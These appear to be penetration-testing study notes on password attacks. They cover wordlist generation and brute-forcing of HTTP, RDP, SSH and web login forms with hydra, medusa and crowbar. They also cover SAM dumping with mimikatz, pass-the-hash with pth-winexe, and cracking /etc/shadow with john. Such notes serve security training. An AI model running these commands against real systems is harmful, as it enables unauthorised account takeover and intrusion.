WORDLISTS:<<<
WORDLISTS ARE STORED AT /usr/share/wordlists BUT YOU CAN GENERATE A CUSTOM STANDARD LIST FROM A DOMAIN BY RUNNING
cewl www.website.com -m 4 -w WORDLIST.TXT
WHERE 
-m IS MINIMUM LETTERS IN WORD
-w IS WHERE THE OUTPUT GOES

THEN YOU CAN MUTATE WITH JOHN 
CONF IS LOCATED AT /etc/john/john.conf TO ALTER THE MUTATIONS AND THEN
john --wordlist=WORDLIST.TXT --rules --stdout > MUTATEDWORDLIST.TXT
WHERE
--rules JUST DEFINES TO USE THE RULES IN THE CONF TO MUTATE WITH
--stdout JUSTOUTPUTS THE WORDLIST TO STDOUT SO YOU CAN WRITE TO A FILE

IF WE KNOW THE RULES ENFORCED FOR PASSWORDS I.E. 1 CAP LETTER 2 LOWER CASE 2 SPECIAL CHARACTERS AND 3 NUMBERS 
WE CAN USE CRUNCH TO MAKE A BRUTEFORCE LIST BASED ON THOSE RULES TO USE AS A DICTIONARY
crunch 8 8 -t ,@@^^%%%
WHERE
8 8 SPECIFIES 8 MIN 8 MAX CHARACTERS
, IS FOR UPPER CASE
@@ MEANS TWO LOWER CASE
^^ MEANS 2 SPECIAL CHARACTERS
%%% MEANS 3 NUMERICS

OR WE CAN USE CRUNCH TO PASS A CHARACTER SET DIRECTLY I.E.
crunch 4 6 0123456789abcdef -o CRUNCH.TXT

OR USE THE CHAR SET IN /usr/share/cruNch/charset.lst, I.E.
crunch 4 6 /usr/share/crunch/charset.lst mixalpha -O MIXALPHA.TXT

NETWORK SERVICE ATTACK METHODS:<<<<<

HTTP HTACCESS ATTACK WITH MEDUSA:
IF YOU FIND AN HTACCESS PROTECTED WEB DIRECTORY YOU COULD TRY
medusa -h ip.add.he.re -u admin -P /usr/share/wordlists/rockyou.txt -M HTTP -m DIR:/admin
WHERE
-h IS HOST
-u IS USER
-M IS AUTH SCHEME
-m IS PROTECTED URL

USE -d TO SEE MEDUSA MODULES

RDP ATTACK WITH CROWBAR:<<<<<

crowbar -b rdp -s ip.add.he.re -u admin -C PASSFILE.TXT -n 1
WHERE
-b PROTOCOL
-s IS THE SERVER
-u IS THE USERNAME
-C IS THE WORDLIST
-n IS THE NUMBER OF THREADS

SSH ATTACK WITH THC-HYDRA:>>>>

hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://ip.add.he.re
WHERE
-l IS THE USERNAME
-P IS THE WORDLIST

HTTP POST ATTACK WITH THC HYDRA:<<<<

SEARCH THE LOGIN FORM FOR THE PHP PAGE THAT POSTS, DETERMINE THE SYNTAX, THE PIECE TOGETHER THE REQUEST I.E.

hydra ip.add.he.re http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l ADMIN -P /WORD/LIST/PATH.TXT -vV -f

LEVERAGING PASSWORD HASHES:<<<<<<<

YOU CAN ALWAYS USE hashid TO DETERMINE A PASSWORD HASH TYPE

ON WINDOWS YOU CAN USE MIMIKATZ TO DETERMINE HASHES FOR PASSWORDS I.E.

mimikatz.exe

privilege::debug

token::elevate

THEN

lsadump::sam

WE CAN THE USE pth-winexe TO USE THIS HASH TO AUTHENTICATE IN SOME CASES IF AN SMB SHARE IS PRESENT

pth-winexe -U user%HASHSTRING //smb.sh.ar.e cmd

WHERE 
-U IS THE USERNAME AND HASH
// IS THE SMB SHARE
cmd I WHAT TO EXECUTE AFTER AUTHENTICATING

IF WE SAVE HASHES IN A FILE WE CAN ATTEMPT TO CRACK FOR CLEARTEXT PASWORDS USING JOHN
sudo john hash.txt --format=NT

WE CAN ALSO USE A WORDLIST TO TRY TO EXPEDITE THE PROCESS

sudo john --wordlist=wordlist hash.txt --format=NT

OR MUTATE THE LIST

sudo john --rules --wordlist=wordlist hash.txt --format=NT

FOR LINUX HASHES FIRST RUN UNSHADOW
unshadow /etc/passwd /etc/shadow > UNSHADOWED.TXT

THEN

john --rules --wordlist=WORDLIST UNSHADOWED.TXT

IF YOU CAN LEVERAGE GPU POWER USE HASHCAT INSTEAD!!!!!!<!<!<!<!<!<!<!<
